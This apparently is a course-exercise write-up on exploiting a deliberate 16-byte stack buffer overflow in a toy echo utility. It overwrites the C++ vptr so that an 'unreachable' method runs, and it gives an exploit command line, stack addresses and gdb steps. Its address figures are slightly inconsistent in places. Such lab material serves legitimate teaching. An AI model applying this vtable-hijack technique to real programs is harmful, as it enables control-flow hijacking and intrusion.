# Doc

## Program Description

The program receives string as an input, and prints it to stdout

`-n` flag will output the trailing newline

`-e` flag will enable interpretation of backslash escapes

## Vulnerability

- set env variable `ECHOUTIL_OPT_ON` to something (other than NULL) to make `allow_options`=true
- add flag -e to make `do_escape`=true and call the function `handle_escape`
- enter input string that starts with `\\\\` to pass the if statement `if(do_escape && s[0] == '\\')` (four backslashes to escape the backslash itself)
- to enter the `case 'x'` in the switch statement (line 89), we need the first char after the `\\\\` to be `x`, because `switch (l.buffer[0])` checks the first letter after it.
- the struct `l` that defined in the function `handle_escape` has a member called `buffer` that allocates 16 chars on the stack, so if the input will startswith `\\\\` and the rest of the input length will be bigger than 16, we can do buffer overflow

## Exploit

### Description

- On the stack, right after `l.buffer`, there is the vptr of `Handler`. To execute the `unreachable` function on `l.h`, we can set the address of this vptr on the stack with the buffer overflow to the same address-4, to call `unreachable` instead of `helper`.
- The address of `Handler` vptr is `0xffffcd14`, and the vptr points to the vtable at: `0x56558ec4`. So we need to change memory address at `0xffffcd04` : from `0x56558ec4` -> `0x56558ec0`

### Change memory with gdb at runtime

change memory address at `0xffffcd14` : from `0x56558ec4` -> `0x56558ec0`

```shell
(gdb) set {int} 0xffffcd04 = 1448447680 # 1448447680 -> 0x56558ec0 (decimal -> hex)
```

### Exploit with input

Repeat `A` 15 times to fill the 16 bytes buffer, and then `\xc0` to decrease the memory address by 4 (the address there is `c4`).

```shell
ECHOUTIL_OPT_ON=deadbeef ./mmn12-q2 -e "$(echo -en "\\\\xAAAAAAAAAAAAAAA\xc0")"
```

## Random Notes

### Registers

ebp
esp (stack pointer, points to the top of the stack)
eip (instruction pointer)

### Addresses

- `l.bufffer` at 0xffffcd14 (16 bytes)
- `l.h` at 0xffffcd24
- The address that holds pointer to `unreachable` function (and also the address of the virtual table of `l.h`) - `0x56558ec4`
- The address that holds pointer to `helper` function - `0x56558ec8`
- `helper` function - `0x56556824`
- `unreachable` function - `0x565567ee`

### GDB Commands

```shell
set environment ECHOUTIL_OPT_ON=test # set environemnt variable
set args -e \\\\XAAAAAAAAAAAAAAABBBB # set argv for the program
break handle_escape # breakpoint at function handle_escape
break main
x/1i $eip # print the value the register $eip holds
x/16x $esp # print esp (which points to the top of the stack) and 16 bytes higher (which is also the stack)
```
